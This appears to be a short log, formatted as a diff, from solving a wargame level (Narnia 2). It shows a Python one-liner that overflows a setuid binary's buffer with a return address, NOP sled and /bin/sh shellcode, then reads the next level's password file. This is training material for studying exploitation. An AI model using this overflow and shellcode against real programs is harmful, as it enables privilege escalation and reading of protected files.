@@ -1,0 +1,5 @@
+narnia2@narnia:/narnia$  /narnia/narnia2 `python -c "print '0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwww' + '\x10\xd6\xff\xff' + '\x90'*90 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80'"`
+$ id
+uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14002(narnia2)
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
